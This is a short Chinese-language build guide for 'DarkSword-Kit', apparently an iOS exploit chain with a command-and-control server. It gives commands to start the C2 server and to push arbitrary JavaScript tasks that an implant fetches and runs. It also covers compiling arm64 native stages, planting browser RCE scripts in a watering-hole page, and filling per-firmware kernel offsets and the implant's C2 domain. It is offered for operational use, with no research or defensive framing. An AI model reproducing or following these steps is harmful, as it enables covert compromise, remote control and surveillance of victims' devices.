# BUILD — DarkSword-Kit 搭建指南

## 1. C2 服务器（任意 Linux/Windows，只需 Python 3.10+）

```bash
# 1) 编辑 c2/c2_config.json：
#    - listen_port / shared_token 按你的服务器改
# 2) 启动
python3 c2/server.py -c c2/c2_config.json

# 3) 验证
curl -X POST http://127.0.0.1:8443/collect \
     -H "Content-Type: application/json" -d '{"meta":"ping"}'
# 返回 {"ok":true} 即通
```

运维端推任务（implant 的 GET /task 会取走并执行）：

```bash
curl -X POST http://127.0.0.1:8443/task \
     -H "X-Auth-Token: TOKEN_PLACEHOLDER" \
     -H "Content-Type: text/javascript" \
     --data-binary "(()=>({os:'probe'}))()"
```

生产部署建议：前面加 nginx 做 TLS 终结（implant.js 里 C2_HOST 填你的域名），
C2 本体只监听 127.0.0.1。

## 2. C 阶段（需要 macOS + Xcode，编译 arm64）

```bash
make syntax-check   # 语法验证
make SDK=iphoneos   # 产出 build/chain
```

本机没有工具链时，仅做语法检查也可以在任何装了 clang 的环境跑。

## 3. 浏览器侧（水坑页）

把 `js/rce_gc.js`（或 `rce_jit.js`）与 `js/chain.js` 挂进目标页面。
RCE 成功建立 `window.__primitive` 后，chain.js 把流程交给原生阶段。

## 4. 设备侧填偏移

- `src/*.c` 中的 `OFFSET_*` / `CHECK_FN` / `PATCH_BYTE` 按目标固件 kernelcache 填
- `implant/implant.js` 的 `C2_HOST` 填你的 C2 域名
